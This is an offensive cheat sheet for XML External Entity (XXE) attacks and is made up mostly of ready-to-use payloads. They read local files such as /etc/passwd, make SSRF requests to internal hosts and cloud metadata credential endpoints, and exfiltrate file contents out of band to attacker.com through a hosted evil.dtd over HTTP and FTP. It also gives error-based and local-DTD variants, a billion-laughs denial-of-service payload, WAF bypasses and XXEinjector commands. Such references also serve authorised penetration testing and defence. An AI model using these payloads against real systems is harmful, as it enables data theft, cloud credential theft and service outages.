# XML External Entity (XXE)

## TL;DR

Exploit XML parsers to read files, perform SSRF, or execute code.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

## Detection

### Basic Entity Test

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY test "xxe_test">]>
<data>&test;</data>
```

If `xxe_test` appears → XXE possible.

### External Entity Test

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<data>&xxe;</data>
```

## File Read

### Basic

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

### Windows

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
```

### PHP Filter (Base64)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
```

### Directory Listing (Java)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/">]>
```

## SSRF via XXE

### Internal Network

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
<data>&xxe;</data>
```

### Cloud Metadata

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
```

## Blind XXE

### OOB Detection

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe_test">%xxe;]>
```

### OOB Data Exfiltration

**evil.dtd (on attacker server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
```

### FTP Exfiltration (Multi-line)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
```

## Error-Based XXE

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Local DTD Exploitation

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

## DoS

### Billion Laughs

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>
```

## XInclude

When you can't control DOCTYPE:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## SVG XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>
```

## Office Documents (DOCX/XLSX)

1. Unzip document
2. Edit `word/document.xml`
3. Insert XXE payload
4. Rezip and upload

## Protocol Handlers

```
file://      Local files
http://      HTTP requests
ftp://       FTP (multi-line exfil)
gopher://    SSRF chains
jar://       Java archive
php://       PHP wrappers
expect://    Command execution
phar://      PHP archives
```

## WAF Bypass

### UTF-7 Encoding

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo...
```

### Parameter Entities

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

## Content-Type Manipulation

**XML Instead of JSON:**
```http
POST /api/data HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

## Checklist

1. Check for XML endpoints (Content-Type: application/xml)
2. Try converting JSON → XML
3. Test file upload (SVG, DOCX, XLSX)
4. Check RSS/Atom feed parsers
5. Test SOAP endpoints
6. Try XInclude for partial control
7. Test error-based if blind
8. Check OOB interaction (DNS/HTTP)
9. Look for local DTD files

## Tools

```bash
# xxeserv
xxeserv -w -p 8000

# XXEinjector
ruby XXEinjector.rb --host=attacker.com --file=request.txt
```

## Real Examples

- **HackerOne #486732 (DuckDuckGo):** Blind XXE
- **HackerOne #248668 (Twitter SMS):** XXE in SXMP protocol
